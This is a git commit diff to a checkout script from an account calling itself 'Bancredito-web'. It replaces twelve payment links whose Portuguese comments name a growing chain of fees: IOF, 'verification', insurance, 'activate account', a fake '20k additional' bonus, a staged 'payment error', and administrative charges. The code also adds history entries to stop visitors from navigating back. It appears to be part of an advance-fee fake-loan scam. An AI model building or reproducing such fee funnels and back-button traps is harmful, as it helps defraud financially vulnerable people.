483683d767f589661824b1fb1c9bf0f76bc44f09
Bancredito-web <franceswright9753@gmail.com>
2026-01-17 00:00:23 -0300

    Update checkout-shared.js

--- js/checkout-shared.js
+++ js/checkout-shared.js
@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.finalizepagamento.store/695410e9ede5279f00b12e64", // IOF
-    up2: "https://pay.finalizepagamento.store/695418c3795ed29f33a38f82", // Taxa de verificação de IOF
-    up3: "https://pay.finalizepagamento.store/69541a63a1fcd46a2127c5af", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.finalizepagamento.store/69541ab8ede5279f00b13ad6", // NFe
-    up5: "https://pay.finalizepagamento.store/69541af2795ed29f33a392bb", // Ativar conta
-    up6: "https://pay.finalizepagamento.store/69541b24ede5279f00b13bda", // Taxa de registro do contrato
-    up7: "https://pay.finalizepagamento.store/69541b98a1fcd46a2127c7cb", // Parabéns, 20k adicional
-    up8: "https://pay.finalizepagamento.store/69541bd9a1fcd46a2127c832", // Erro no pagamento - 14,06
-    up9: "https://pay.finalizepagamento.store/69541c25a1fcd46a2127c8b9", // APP - 11,99
-    up10:"https://pay.finalizepagamento.store/69541c5d795ed29f33a39534", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.finalizepagamento.store/69541c99a1fcd46a2127c968", // Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.finalizepagamento.store/69541ccdede5279f00b13f04" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://go.sharkpayments.com.br/aoy4en1fgy", // IOF
+    up2: "https://go.sharkpayments.com.br/tu27rzm4zp", // Taxa de verificação de IOF
+    up3: "https://go.sharkpayments.com.br/wjotszd7no", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://go.sharkpayments.com.br/peewbobaok", // NFe
+    up5: "https://go.sharkpayments.com.br/ci2ublzw4u", // Ativar conta
+    up6: "https://go.sharkpayments.com.br/kbuyi328ce", // Taxa de registro do contrato
+    up7: "https://go.sharkpayments.com.br/c9gu2kika1", // Parabéns, 20k adicional
+    up8: "https://go.sharkpayments.com.br/lqkmaaeutn", // Erro no pagamento - 14,06
+    up9: "https://go.sharkpayments.com.br/fb83qietrl", // APP - 11,99
+    up10:"https://go.sharkpayments.com.br/mvqsqqczt9", // Taxa de Abertura TAC - 16,92
+    up11:"https://go.sharkpayments.com.br/pbtgdtyy8i", // Taxa de Consultoria Financeira - 19,53
+    up12:"https://go.sharkpayments.com.br/binmsf865k" // Taxa de Processamento Administrativo - 31,92
 
 };
 
@@ -34,4 +34,5 @@ function redirect(key) {
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
 history.pushState({}, '', location.href);
+
 
